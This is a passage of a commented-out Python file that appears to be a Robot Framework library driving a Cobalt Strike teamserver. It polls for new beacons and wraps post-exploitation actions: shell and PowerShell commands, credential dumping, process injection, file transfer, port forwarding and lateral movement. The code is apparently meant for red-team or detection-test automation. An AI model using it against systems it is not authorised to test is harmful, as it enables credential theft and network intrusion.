#                                 f"WAITLOOP {iteration}:  -> NEW Beacon Detected! ID='{bid}', Listener='{beacon_listener}', IP='{bip}'")
#
#                             # Check listener filter
#                             if listener_name is None or beacon_listener.lower() == listener_name.lower():
#                                 print(f"WAITLOOP {iteration}:  -> MATCH FOUND! Returning beacon ID: '{bid}'")
#                                 return bid  # Success!
#                             else:
#                                 print(
#                                     f"WAITLOOP {iteration}:  -> New beacon '{bid}' ignored (Filter mismatch: need Listener='{listener_name}')")
#                                 initial_beacon_ids_set.add(bid)  # Prevent detection in future loops
#                         else:
#                             if bid in initial_beacon_ids_set:
#                                 print(f"WAITLOOP {iteration}:  -> Existing beacon ID '{bid}'.")
#                             if bip == specific_ip:
#                                 print(f"WAITLOOP {iteration}:  -> Beacon '{bid}' has specific IP '{bip}', skipping.")
#
#                     if iteration % 6 == 1:  # Log periodically which IDs were processed
#                         print(
#                             f"WAITLOOP {iteration}: Finished processing current poll. IDs seen: {sorted(processed_ids_this_iter)}")
#
#
#                 except AttributeError as list_iter_err:
#                     # Catch error if current_beacons_list doesn't support iteration
#                     print(
#                         f"WAITLOOP {iteration}: ERROR iterating through get_beacons result: {type(list_iter_err).__name__}: {list_iter_err}. Result was: {current_beacons_list}")
#                 except Exception as proc_err:
#                     # Catch other unexpected errors during processing
#                     print(f"WAITLOOP {iteration}: ERROR processing beacon list: {type(proc_err).__name__}: {proc_err}")
#
#             else:
#                 print(f"WAITLOOP {iteration}: Skipping comparison due to connection/get_beacons error.")
#
#             print(f"WAITLOOP {iteration}: Iteration complete. Sleeping 5s...")
#             time.sleep(5)  # Check interval
#
#         # If loop finishes, timeout occurred
#         print(f"WAIT: Loop finished after {time.time() - start_time:.1f} seconds.")  # Log loop end time
#         raise RuntimeError(
#             f"Timeout: No new matching beacon checked in with different IP (not {specific_ip}) within {timeout_seconds} seconds.")
#
#     # ==========================================================================
#     # ============ END OF wait_for_beacon_checkin ==============================
#     # ==========================================================================
#
#     @staticmethod
#     def _parse_robot_time(time_str: str) -> float:
#         """Converts Robot Framework time string (e.g., '10s', '2m') to seconds."""
#         # (Implementation remains the same)
#         time_str = str(time_str).lower().strip()
#         if time_str.endswith('ms'): return float(time_str[:-2]) / 1000.0
#         if time_str.endswith('s'): return float(time_str[:-1])
#         if time_str.endswith('m'): return float(time_str[:-1]) * 60.0
#         if time_str.endswith('h'): return float(time_str[:-1]) * 3600.0
#         try:
#             return float(time_str)  # Assume seconds if no unit
#         except ValueError:
#             raise ValueError(f"Invalid time string format: '{time_str}'")
#
#     # --- Action Keywords (Wrapping issue_* methods) ---
#     # (Implementations remain the same, ensure they use _ensure_active_session)
#
#     def run_command(self, command: str):
#         session = self._ensure_active_session();
#         c2 = self._ensure_ready()
#         result = c2.issue_cmd_to_shell(session, command)
#         if not result.success: raise AssertionError(f"Run Command failed: {result.result}")
#         print(f"Run Command successful. Output: {result.result}")
#         return result.result
#
#     def change_directory(self, remote_path: str):
#         session = self._ensure_active_session();
#         c2 = self._ensure_ready()
#         result = c2.issue_bcd(session, remote_path)
#         if not result.success: raise AssertionError(f"Change Directory Command failed: {result.result}")
#         print(f"Change Directory command successful. Output: {result.result}")
#         return result.result
#
#     def dump_credentials(self):
#         session = self._ensure_active_session();
#         c2 = self._ensure_ready()
#         result = c2.issue_credential_dump(session)
#         if not result.success: raise AssertionError(f"Credential dump failed: {result.result}")
#         print(f"Credential dump successful. Output: {result.result}")
#         return result.result
#
#     def inject_payload(self, pid: str, listener: str, arch: str = "x64"):
#         session = self._ensure_active_session();
#         c2 = self._ensure_ready()
#         try:
#             pid_int = int(pid)
#         except ValueError:
#             raise ValueError(f"Invalid PID: '{pid}'.")
#         result = c2.issue_binject(session, pid_int, listener, arch)
#         if not result.success: raise AssertionError(f"Inject Payload failed: {result.result}")
#         print(f"Inject Payload successful. Result: {result.result}")
#         return result.result
#
#     def download_file(self, remote_path: str, local_dir: Optional[str] = None):
#         session = self._ensure_active_session();
#         c2 = self._ensure_ready()
#         print(f"Triggering download of '{remote_path}' from beacon {session.beacon_id}.")
#         print(f"NOTE: File saves on Cobalt Strike teamserver filesystem.")
#         result = c2.issue_bdownload(session, remote_path)
#         if not result.success: raise AssertionError(f"Download File trigger failed: {result.result}")
#         print(f"Download successful. Result: {result.result}")
#         return result.result
#
#     def upload_file(self, local_path: str, remote_path: Optional[str] = None):
#         session = self._ensure_active_session();
#         c2 = self._ensure_ready()
#         abs_local_path = Path(local_path).resolve()
#         if not abs_local_path.is_file(): raise FileNotFoundError(f"Local upload file not found: {abs_local_path}")
#         result = c2.issue_bupload(session, str(abs_local_path), remote_path)
#         if not result.success: raise AssertionError(f"Upload File failed: {result.result}")
#         print(f"Upload File successful. Result: {result.result}")
#         return result.result
#
#     def run_port_forwarding(self, bind_port: int, host: str, port_fwd: int):
#         session = self._ensure_active_session();
#         c2 = self._ensure_ready()
#         result = c2.issue_brportfwd(session, bind_port, host, port_fwd)
#         # if not result.success: raise AssertionError(f"Upload File failed: {result.result}")
#         print(f"Port forwarding successful. Result: {result.result}")
#         return result.result
#
#     def run_lateral_movement(self, method: str, target: str, listener: str):
#         session = self._ensure_active_session();
#         c2 = self._ensure_ready()
#         try:
#             result = c2.issue_lateral_move(session, target, method, listener)
#             if not result.success: raise AssertionError(f"Lateral Movement ({method}) failed: {result.result}")
#             print(f"Lateral Movement ({method}) successful. Result: {result.result}")
#             return result.result
#         except Exception as e:
#             raise AssertionError(
#                 f"Lateral Movement ({method}) encountered an exception: {type(e).__name__}: {e}")  # Re-raise as AssertionError
#
#     def run_PsCommand(self, command: str):
#         session = self._ensure_active_session();
#         c2 = self._ensure_ready()
#         result = c2.issue_bpowershell(session, command)
#         if not result.success: raise AssertionError(f"Run PowerShell failed: {result.result}")
#         print(f"Run PowerShell successful. Output: {result.result}")
#         return result.result
#
#     def kill_active_session(self):
#         """Attempts to kill the currently active beacon session."""
#         session = self._ensure_active_session()
#         c2 = self._ensure_ready()
#         print(f"Attempting to kill active session: {session.beacon_id}")
#         if not c2.kill_session(session):
#             print(f"Warning: Kill session command for {session.beacon_id} failed/unconfirmed.")
#         else:
#             print(f"Kill session command sent for {session.beacon_id}.")
#         self.active_session = None  # Deactivate locally
#
#     def put_beacon_to_sleep(self, sleep_time: int, jitter: Optional[int] = 0):
#
#         session = self._ensure_active_session()
#         c2 = self._ensure_ready()
#
#         try:
#             result = c2.issue_bsleep(session, sleep_time, jitter)
#             if not result.success:
#                 raise AssertionError(f"Result: {result.result}")
#             else:
#                 return result.result
#
#         except Exception as e:
#             raise AssertionError(
#                 f"Put beacon to sleep encountered an exception: {type(e).__name__}: {e}")
#
#     def kill_beacon(self):
#
#         session = self._ensure_active_session()
#         c2 = self._ensure_ready()
#
#         try:
#             result = c2.issue_bexit(session)
#             if not result.success:
#                 raise AssertionError(f"Result: {result.result}")
#             else:
#                 return result.result
#
#         except Exception as e:
#             raise AssertionError(
#                 f"Put beacon to exit encountered an exception: {type(e).__name__}: {e}")
#
#     def get_beacon_list(self) -> list:
#         c2 = self._ensure_ready()
#
#         return c2.get_beacon_list()
#
#     def get_beacon_info(self, beacon_id: str) -> dict:
#         c2 = self._ensure_ready()
#
#         return c2.get_beacon_info_by_id(beacon_id)

# --- END OF Python Script ---